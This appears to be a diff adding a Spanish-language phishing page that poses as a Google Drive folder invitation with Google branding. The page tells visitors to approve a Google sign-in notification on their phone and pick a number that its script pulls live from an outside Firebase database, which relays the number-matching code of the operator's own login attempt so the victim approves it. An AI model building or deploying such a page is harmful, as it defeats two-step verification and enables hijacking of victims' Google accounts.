@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<link rel="icon" href="https://i.ibb.co/pyp9n23/icons.png" type="image/x-icon">
+<link rel="shortcut icon" href="https://i.ibb.co/pyp9n23/icons.png" type="image/x-icon">
+  
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <meta property="og:title" content="Dibujos - Drive" />
+<meta property="og:description" content="google.com" />
+<meta property="og:image" content="https://i.ibb.co/2dXmSRq/Loguito.png" />
+  <title>Invitación al drive</title>
+  <style>
+    /* Estilos generales */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+@media screen {
+  body:has(iframe) .footer {
+    display: none;
+  }
+}
+
+
+
+
+    /* Estilos del contenedor principal */
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    /* Estilos del logo */
+    .logo {
+      width: 70px;
+      margin-top: 50px;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    /* Estilos del formulario */
+    .form {
+      display: flex;
+      flex-direction: column;
+      width: 355px;
+      background-color: rgba(255, 255, 255, 0.9);
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+      padding: 35px;
+      margin-top: 100px;
+      padding-top: 5px;
+      padding-bottom: 100px;
+    }
+
+    /* Estilos del título */
+    .title {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 20px;
+      font-family: "Roboto","Noto Sans Myanmar UI",arial,sans-serif;
+      color: #202124;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    /* Estilos del número */
+    .numero {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 54px;
+      font-family: "Arial Bold","Noto Sans Myanmar UI",arial,sans-serif;
+      color: #202124;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    /* Estilos del subtítulo */
+    .subtitle {
+      font-size: 15px;
+      margin-top: 5px;
+      font-family: "Noto Sans Myanmar UI",arial;
+      color: #444444;
+    }
+
+    /* Estilos del enlace */
+    .link {
+      text-decoration: none;
+      color: #1a73e8;
+      font-size: 14px;
+      margin-top: 20px;
+      font-family: Roboto, sans-serif;
+    }
+
+    /* Estilos del pie de página */
+    .footer {
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .footer p {
+      font-size: 12px;
+      font-family: Arial, sans-serif;
+      word-spacing: 28px;
+      color: #5f6368;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <form class="form">
+      <!-- Logo de Goo -->
+      <img src="https://i.ibb.co/ygHBjNN/gssr-272x92dp.png" alt="Google" class="logo">
+      <br>
+      
+      <!-- Título del formulario -->
+      <div class="title">
+        Acepte la solicitud enviada a su dispositivo y solicite el número para acceder a la carpeta
+      </div>
+      <br><br>
+      
+      <!-- Aquí se mostrará el número -->
+      <div class="numero" id="numero"></div>
+      <br>
+      
+      <!-- Subtítulo con instrucciones -->
+      <div class="subtitle">Google ha enviado 
+una notificacion a su dispositivo,  abre la aplicacion 
+gmail o youtube, toca <strong>Sí</strong> en la notificación y marca el numero para acceder a <strong>dibujos</strong>.</div>
+      <br>
+      
+      <!-- Enlace -->
+      <a href="#" class="link">Revise sus notificaciones</a>
+    </form>
+    
+    <!-- Pie de página -->
+    <div class="footer">
+      <p>Español(España) Ayuda Privacidad Términos</p>
+    </div>
+  </div>
+
+  <!-- Firebase App (es la base) -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <!-- Firebase Database -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+  <script>
+    // Configuración de Firebase
+    const firebaseConfig = {
+  apiKey: "AIzaSyBMpv8I8RyrDFvSF5atpHTgVMqR_Hz3AoY",
+  authDomain: "numero-sincronizacion.firebaseapp.com",
+  databaseURL: "https://numero-sincronizacion-default-rtdb.firebaseio.com",
+  projectId: "numero-sincronizacion",
+  storageBucket: "numero-sincronizacion.firebasestorage.app",
+  messagingSenderId: "298402959829",
+  appId: "1:298402959829:web:f0482c0007a11500886d5c",
+  measurementId: "G-ZQG9SPBT2P"
+}; 
+
+
+    // Inicializar Firebase
+    firebase.initializeApp(firebaseConfig);
+    
+    // Obtener referencia a la base de datos
+    const database = firebase.database();
+    const numeroRef = database.ref('numero');
+    
+    // Función para escuchar cambios en tiempo real
+    numeroRef.on('value', (snapshot) => {
+      const data = snapshot.val();
+      const numeroElement = document.getElementById("numero");
+      
+      if (data && data.trim() !== "") {
+        numeroElement.textContent = data;
+      } else {
+        numeroElement.textContent = "";
+      }
+    }, (error) => {
+      console.error("Error al obtener el número:", error);
+      document.getElementById("numero").textContent = "Error al cargar";
+    });
+  </script>
+</body>
+</html>
